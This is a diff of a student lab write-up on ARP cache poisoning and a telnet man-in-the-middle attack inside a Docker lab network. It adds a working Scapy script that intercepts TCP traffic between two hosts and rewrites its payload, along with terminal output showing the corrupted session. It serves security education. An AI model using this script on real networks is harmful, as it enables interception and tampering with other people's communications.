@@ -1,4 +1,4 @@
-### Docker config
+### Docker Config
 ```shell
 seed@VM:~/.../volumes$ dockps
 965fffded138  M-10.9.0.105
@@ -62,7 +62,94 @@ Address                  HWtype  HWaddress           Flags Mask            Iface
 ### Task 2.2: Testing
 We first turn off ip forwarding for host M. We then send a ping request from A to B. Below is the wireshark packet capture:
 ![image](https://github.com/user-attachments/assets/02924e41-eb9f-463f-ab87-c1adb7a9bc4f)
-In summary, the ping requests fail, and eventually host A sends out an ARP request to host B who replies with their correct ip address, and the pings begin to succeed again.
+In summary, the ping requests fail, and eventually host A sends out an ARP request to host B who replies with their correct ip address, and the pings begin to succeed.
 
 ### Task 2.3: Turn on IP Forwarding
 After we poison the caches again, we turn on ip forwarding for host M. We then send a ping request from A to B. Below is the wireshark packet capture:
+![image](https://github.com/user-attachments/assets/7b509afd-f039-41de-8fdb-534a72657a8c)
+We can see that M makes an ARP request for B and begins forwarding the ping requests from A to B and then back from B to A, acting as the man in the middle.
+
+### Task 2.4: Launch the MITM attack
+First, we need to establish a telnet connection from host A to host B (which is being forwarded through host M, our middle man)
+```shell
+root@ef3a05ea874d:/# telnet 10.9.0.6
+Trying 10.9.0.6...
+Connected to 10.9.0.6.
+Escape character is '^]'.
+Ubuntu 20.04.1 LTS
+9cd27edc87ad login: seed
+Password: 
+Welcome to Ubuntu 20.04.1 LTS (GNU/Linux 5.4.0-54-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+This system has been minimized by removing packages and content that are
+not required on a system that users do not log into.
+
+To restore this content, you can run the 'unminimize' command.
+Last login: Wed Oct 16 23:06:56 UTC 2024 from A-10.9.0.5.net-10.9.0.0 on pts/2
+seed@9cd27edc87ad:~$ ls
+```
+
+With this connection established, we now turn off M's ip forwarding. Doing so completely freezes the telnet session; our service has been denied! Sad.
+
+Now let's get into the actual Man in the Middle Attack. We'll use the following scapy script:
+```python3
+#!/usr/bin/env python3
+from scapy.all import *
+
+IP_A = "10.9.0.5"
+MAC_A = "02:42:0a:09:00:05"
+IP_B = "10.9.0.6"
+MAC_B = "02:42:0a:09:00:06"
+
+def spoof_pkt(pkt):
+    if IP in pkt and TCP in pkt:
+        if pkt[IP].src == IP_A and pkt[IP].dst == IP_B:
+            # Create a new packet based on the captured one.
+            L3 = IP(src=pkt[IP].src, dst=pkt[IP].dst)
+            L4 = TCP(sport=pkt[TCP].sport, dport=pkt[TCP].dport, flags=pkt[TCP].flags, seq=pkt[TCP].seq, ack=pkt[TCP].ack)
+            # Construct the new payload based on the old payload.
+            if pkt[TCP].payload:
+                data = pkt[TCP].payload.load # The original payload data
+                newdata = b"Z"
+                newpkt = L3/L4/newdata
+                del(newpkt.chksum)
+                del(newpkt[TCP].chksum)
+                send(newpkt)
+                print(f"replaced {data} with {newdata}")
+            else:
+                send(pkt[IP])
+        elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
+            newpkt = IP(bytes(pkt[IP]))/TCP(bytes(pkt[TCP]))
+            del(newpkt.chksum)
+            del(newpkt[TCP].chksum)
+            send(newpkt)
+
+#we only want to spoof packets between hosts A and B, so isolate their respective addresses
+f = f'tcp and (ether src {MAC_A} or ether src {MAC_B})'
+pkt = sniff(iface='eth0', filter=f, prn=spoof_pkt)
+```
+This will alter the data from A to B such that, whatever A inputs will be replaced with the character Z
+
+Let's run the script on host M and see what the telnet experience becomes!
+```shell
+seed@9cd27edc87ad:~$ whoami
+seed
+seed@9cd27edc87ad:~$ wZZZZZZ
+-bash: wZZZZZZ: command not found
+seed@9cd27edc87ad:~$ lZZZ
+-bash: lZZZ: command not found
+seed@9cd27edc87ad:~$ hZZZZZZpZ
+-bash: hZZZZZZpZ: command not found
+seed@9cd27edc87ad:~$
+```
+as we can see, it renders the telnet client unusable. Here's what it looks like in wireshark:
+![image](https://github.com/user-attachments/assets/2c1eed7f-66fa-4e75-bfef-a6c24820dbf8)
+
+
+
+
+
